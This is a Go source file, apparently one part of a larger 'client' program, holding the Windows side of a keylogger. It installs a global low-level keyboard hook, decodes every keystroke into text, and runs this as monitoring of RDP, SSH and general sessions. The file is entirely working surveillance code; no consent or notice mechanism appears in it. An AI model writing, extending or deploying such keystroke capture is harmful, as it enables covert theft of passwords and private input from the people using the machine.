//go:build windows
// +build windows

package client

import (
	"fmt"
	"log"
	"syscall"
	"unsafe"
)

var (
	user32DLL   *syscall.LazyDLL
	kernel32DLL *syscall.LazyDLL

	procSetWindowsHookEx    *syscall.LazyProc
	procCallNextHookEx      *syscall.LazyProc
	procUnhookWindowsHookEx *syscall.LazyProc
	procGetMessage          *syscall.LazyProc
	procGetKeyboardState    *syscall.LazyProc
	procGetKeyNameText      *syscall.LazyProc
	procToUnicodeEx         *syscall.LazyProc
	procGetKeyboardLayout   *syscall.LazyProc
	procMapVirtualKey       *syscall.LazyProc
)

func initKeyloggerDLLs() {
	log.Printf("[DEBUG] initKeyloggerDLLs: Starting DLL initialization")
	if user32DLL != nil {
		log.Printf("[DEBUG] initKeyloggerDLLs: Already initialized")
		return // Already initialized
	}
	log.Printf("[DEBUG] initKeyloggerDLLs: Loading user32.dll")
	user32DLL = syscall.NewLazyDLL("user32.dll")
	log.Printf("[DEBUG] initKeyloggerDLLs: Loading kernel32.dll")
	kernel32DLL = syscall.NewLazyDLL("kernel32.dll")
	log.Printf("[DEBUG] initKeyloggerDLLs: Loading procs")
	procSetWindowsHookEx = user32DLL.NewProc("SetWindowsHookExW")
	procCallNextHookEx = user32DLL.NewProc("CallNextHookEx")
	procUnhookWindowsHookEx = user32DLL.NewProc("UnhookWindowsHookEx")
	procGetMessage = user32DLL.NewProc("GetMessageW")
	procGetKeyboardState = user32DLL.NewProc("GetKeyboardState")
	procGetKeyNameText = user32DLL.NewProc("GetKeyNameTextW")
	procToUnicodeEx = user32DLL.NewProc("ToUnicodeEx")
	procGetKeyboardLayout = user32DLL.NewProc("GetKeyboardLayout")
	procMapVirtualKey = user32DLL.NewProc("MapVirtualKeyW")
	log.Printf("[DEBUG] initKeyloggerDLLs: Completed successfully")
}

const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 0x0100
	WM_SYSKEYDOWN  = 0x0104
	HC_ACTION      = 0
)

type (
	HHOOK   uintptr
	WPARAM  uintptr
	LPARAM  uintptr
	LRESULT uintptr
)

type KBDLLHOOKSTRUCT struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

type MSG struct {
	Hwnd    uintptr
	Message uint32
	WParam  WPARAM
	LParam  LPARAM
	Time    uint32
	Pt      struct{ X, Y int32 }
}

var (
	hook      HHOOK
	keylogger *Keylogger
)

// LowLevelKeyboardProc is the callback for keyboard events
func LowLevelKeyboardProc(nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
	if nCode == HC_ACTION {
		kbdStruct := *(*KBDLLHOOKSTRUCT)(unsafe.Pointer(uintptr(lParam)))

		if wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN {
			vkCode := kbdStruct.VkCode
			scanCode := kbdStruct.ScanCode

			// Get the key name
			keyName := getKeyName(vkCode, scanCode)

			// Log the key if keylogger is set
			if keylogger != nil && keylogger.running {
				keylogger.logKeys(keyName)
			}
		}
	}

	ret, _, _ := procCallNextHookEx.Call(
		uintptr(hook),
		uintptr(nCode),
		uintptr(wParam),
		uintptr(lParam),
	)
	return LRESULT(ret)
}

// getKeyName converts virtual key code to readable string
func getKeyName(vkCode, scanCode uint32) string {
	var keyboardState [256]byte
	procGetKeyboardState.Call(uintptr(unsafe.Pointer(&keyboardState[0])))

	// Get keyboard layout
	layout, _, _ := procGetKeyboardLayout.Call(0)

	// Try to convert to Unicode
	var buf [16]uint16
	ret, _, _ := procToUnicodeEx.Call(
		uintptr(vkCode),
		uintptr(scanCode),
		uintptr(unsafe.Pointer(&keyboardState[0])),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		0,
		layout,
	)

	if ret > 0 {
		return syscall.UTF16ToString(buf[:ret])
	}

	// Fallback to special key names
	return getSpecialKeyName(vkCode)
}

// getSpecialKeyName returns names for special keys
func getSpecialKeyName(vkCode uint32) string {
	specialKeys := map[uint32]string{
		0x08: "[BACKSPACE]",
		0x09: "[TAB]",
		0x0D: "[ENTER]",
		0x10: "[SHIFT]",
		0x11: "[CTRL]",
		0x12: "[ALT]",
		0x13: "[PAUSE]",
		0x14: "[CAPS LOCK]",
		0x1B: "[ESC]",
		0x20: " ",
		0x21: "[PAGE UP]",
		0x22: "[PAGE DOWN]",
		0x23: "[END]",
		0x24: "[HOME]",
		0x25: "[LEFT]",
		0x26: "[UP]",
		0x27: "[RIGHT]",
		0x28: "[DOWN]",
		0x2C: "[PRINT SCREEN]",
		0x2D: "[INSERT]",
		0x2E: "[DELETE]",
		0x5B: "[LEFT WIN]",
		0x5C: "[RIGHT WIN]",
		0x5D: "[APPS]",
		0x70: "[F1]",
		0x71: "[F2]",
		0x72: "[F3]",
		0x73: "[F4]",
		0x74: "[F5]",
		0x75: "[F6]",
		0x76: "[F7]",
		0x77: "[F8]",
		0x78: "[F9]",
		0x79: "[F10]",
		0x7A: "[F11]",
		0x7B: "[F12]",
		0x90: "[NUM LOCK]",
		0x91: "[SCROLL LOCK]",
		0xA0: "[LEFT SHIFT]",
		0xA1: "[RIGHT SHIFT]",
		0xA2: "[LEFT CTRL]",
		0xA3: "[RIGHT CTRL]",
		0xA4: "[LEFT ALT]",
		0xA5: "[RIGHT ALT]",
	}

	if name, ok := specialKeys[vkCode]; ok {
		return name
	}

	// For regular keys, try to get the character
	if vkCode >= 0x30 && vkCode <= 0x5A { // 0-9, A-Z
		return string(rune(vkCode))
	}

	return fmt.Sprintf("[VK_%d]", vkCode)
}

// startPlatformMonitor starts Windows-specific keyboard monitoring
func (kl *Keylogger) startPlatformMonitor() error {
	initKeyloggerDLLs()
	keylogger = kl

	// Set the low-level keyboard hook
	hookFunc := syscall.NewCallback(LowLevelKeyboardProc)
	hook, _, err := procSetWindowsHookEx.Call(
		WH_KEYBOARD_LL,
		hookFunc,
		0,
		0,
	)

	if hook == 0 {
		return fmt.Errorf("failed to set keyboard hook: %v", err)
	}

	log.Printf("Windows keyboard hook installed successfully")

	// Message loop
	go func() {
		var msg MSG
		for {
			select {
			case <-kl.stopChan:
				// Unhook
				procUnhookWindowsHookEx.Call(uintptr(hook))
				log.Printf("Windows keyboard hook removed")
				return
			default:
				ret, _, _ := procGetMessage.Call(
					uintptr(unsafe.Pointer(&msg)),
					0,
					0,
					0,
				)
				if ret == 0 {
					return
				}
			}
		}
	}()

	return nil
}

// monitorRDP monitors RDP sessions on Windows
func (kl *Keylogger) monitorRDP() {
	log.Printf("RDP monitoring started (using Windows keyboard hooks)")

	// On Windows, the low-level keyboard hook works for both console and RDP sessions
	err := kl.startPlatformMonitor()
	if err != nil {
		log.Printf("Failed to start RDP monitoring: %v", err)
		return
	}

	// Keep the goroutine alive
	<-kl.stopChan
}

// monitorGeneral provides general keyboard monitoring on Windows
func (kl *Keylogger) monitorGeneral() {
	log.Printf("General keyboard monitoring started (Windows)")

	err := kl.startPlatformMonitor()
	if err != nil {
		log.Printf("Failed to start keyboard monitoring: %v", err)
		return
	}

	// Keep the goroutine alive
	<-kl.stopChan
}

// monitorSSH monitors SSH sessions on Windows
func (kl *Keylogger) monitorSSH() {
	log.Printf("SSH monitoring started (Windows)")
	log.Printf("Note: SSH monitoring on Windows uses the same keyboard hooks as general monitoring")

	// On Windows, use the same keyboard hook mechanism
	err := kl.startPlatformMonitor()
	if err != nil {
		log.Printf("Failed to start SSH monitoring: %v", err)
		return
	}

	// Keep the goroutine alive
	<-kl.stopChan
}
